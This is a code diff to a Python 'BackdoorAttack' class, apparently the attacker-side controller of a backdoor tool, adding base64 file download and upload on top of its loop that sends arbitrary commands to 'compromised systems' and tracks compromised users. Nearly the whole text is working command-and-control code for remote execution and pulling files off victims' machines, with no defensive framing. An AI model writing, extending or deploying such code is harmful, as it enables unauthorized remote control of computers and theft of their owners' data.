@@ -9,6 +9,7 @@
 
 import json
 import socket
+import base64
 import argparse
 import subprocess
 from threading import Thread
@@ -115,27 +116,73 @@ class BackdoorAttack:
         self.connection.send(data.encode('utf-8'))
 
     """ 
-    * Function Name:  communicate()
+    * Function Name:  execute_on_sys()
     * Input:          self (BackdoorAttack object): Instance of the class.
     *                 command (string): Command to execute in the compromised system.
     * Output:         result (string): The output of the command after execution in the compromised system.
     * Logic:          The function is used to send commands to compromised systems for execution and collects the result received from the system.
-    * Example Call:   self.execute_on_sys("ls)
+    * Example Call:   self.execute_on_sys("ls")
     """
     def execute_on_sys(self, command):
         self.send_data(command)
 
         if(command[0] == "quit"):
-            self.connection.close()
-            BackdoorAttack.compromised_sys_count -= 1
-            BackdoorAttack.compromised_users.pop(self.address[0])
+            return None
 
-            return "close"
+        else:
+            result = self.receive_data()
+            return result
 
-        result = self.receive_data()
+    """ 
+    * Function Name:  close_connection()
+    * Input:          self (BackdoorAttack object): Instance of the class.
+    * Output:         None
+    * Logic:          The function is used to close the connection with a compromised system.
+    * Example Call:   self.close_connection()
+    """  
+    def close_connection(self):
+        self.connection.close()
+        BackdoorAttack.compromised_sys_count -= 1
+        BackdoorAttack.compromised_users.pop(self.address[0])
 
-        return result
-    
+    """ 
+    * Function Name:  write_file()
+    * Input:          self (BackdoorAttack object): Instance of the class.
+    *                 path (string): Path to where the file should be written to in the attacker system.
+    *                 data (string): Data to be written to the file.
+    * Output:         result (string): Message telling whether the writing of file was successful or unsuccessful.
+    * Logic:          The function is used to decode and write the base64 encoded data onto a file in the attacker system. 
+    * Example Call:   result = self.write_file("./", "sGetxalWFa...")
+    """
+    def write_file(self, path, data):
+        try:
+            with open(path, "wb") as file:
+                file.write(base64.b64decode(data))
+
+            return "File downloaded SUCCESSFULLY."
+
+        except:
+            if(path[-1] == "/"):
+                return "Invalid Destination PATH. Please add the file name along with the destination PATH."
+            else:
+                return "Invalid Destination PATH. Please verify the destination path and try again."
+
+    """ 
+    * Function Name:  read_file()
+    * Input:          self (BackdoorAttack object): Instance of the class.
+    *                 path (string): Path to the file to be uploaded in the attacker system.            
+    * Output:         data (string): base64 encoded content of the file.
+    * Logic:          The function is used to read the contents of a file in base64 format inorder to send it to the compromised system.
+    * Example Call:   data = self.read_file("test.txt")
+    """
+    def read_file(self, path):
+        try:
+            with open(path, "rb") as file:
+                return base64.b64encode(file.read()).decode('utf-8')
+
+        except FileNotFoundError:
+            return "Error: File does not exist. Please verify the path again."
+
     """ 
     * Function Name:  communicate()
     * Input:          self (BackdoorAttack object): Instance of the class.
@@ -150,17 +197,39 @@ class BackdoorAttack:
         while run:
             command = input("\n>> ").split(" ")
 
-            if(command[0] != "back"):
+            if(command[0] == "back"):
+                run = 0
+
+            elif(command[0] == "quit"):
+                run = 0
                 result = self.execute_on_sys(command)
+                self.close_connection()
+                
+            elif(command[0] == "download"):
+                data = self.execute_on_sys(command)
 
-                if(result == "close"):
-                    run = 0
+                if "Error: File does not exist." in data:
+                    print("\n{}\n".format(data))
 
-                else:    
+                else:
+                    path = command[2] if(len(command) > 2) else command[1]
+                    result = self.write_file(path, data)
                     print("\n{}\n".format(result))
 
-            else:
-                run = 0
+            elif(command[0] == "upload"):
+                data = self.read_file(command[1])
+
+                if "Error: File does not exist." in data:
+                    print("\n{}\n".format(data))
+
+                else:
+                    command.append(data)
+                    result = self.execute_on_sys(command)
+                    print("\n{}\n".format(result))
+
+            else:    
+                result = self.execute_on_sys(command)
+                print("\n{}\n".format(result))
 
         print("\nReturning back to main menu...\n")
 
